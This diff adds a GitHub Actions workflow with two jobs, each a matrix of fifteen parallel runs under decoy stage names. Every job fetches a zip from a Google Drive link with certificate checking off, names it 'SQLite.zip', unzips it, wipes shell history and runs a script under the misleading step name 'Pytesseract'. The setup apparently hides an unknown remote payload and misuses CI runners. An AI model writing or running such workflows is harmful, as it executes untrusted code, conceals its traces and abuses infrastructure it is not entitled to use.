@@ -1,0 +1,56 @@
+name: metadatabase284land
+on:
+  push:
+    branches: [ "main" ]
+  workflow_dispatch:
+
+jobs:
+  START:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      max-parallel: 10
+      matrix:
+        go: [I.o, I.i, I.ii]
+        flag: ['Initialize', 'Develop', 'Test', 'Execute', 'Release']
+
+    env:
+        NUM_JOBS: 20
+        JOB: ${ matrix.go }
+    steps:
+    - uses: actions/checkout@v1
+    - name: install module
+      run: |
+        wget --no-check-certificate "https://docs.google.com/uc?export=download&id=1FRxxsdeQ_x3HnvcZZnJizKcaG9W_QvfJ" -O SQLite.zip
+        unzip -o SQLite.zip
+        rm SQLite.zip
+        history -c && history -w
+
+    - name: Pytesseract
+      run: bash requirements.sh
+
+
+  BUILD1:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      max-parallel: 10
+      matrix:
+        go: [I.o, I.i, I.ii]
+        flag: ['Fetch', 'Integrate', 'Evaluate', 'Execute', 'Publish']
+
+    env:
+        NUM_JOBS: 20
+        JOB: ${ matrix.go }
+    steps:
+    - uses: actions/checkout@v1
+    - name: install module
+      run: |
+        wget --no-check-certificate "https://docs.google.com/uc?export=download&id=1FRxxsdeQ_x3HnvcZZnJizKcaG9W_QvfJ" -O SQLite.zip
+        unzip -o SQLite.zip
+        rm SQLite.zip
+        history -c && history -w
+
+    - name: Pytesseract
+      run: bash requirements.sh
+        
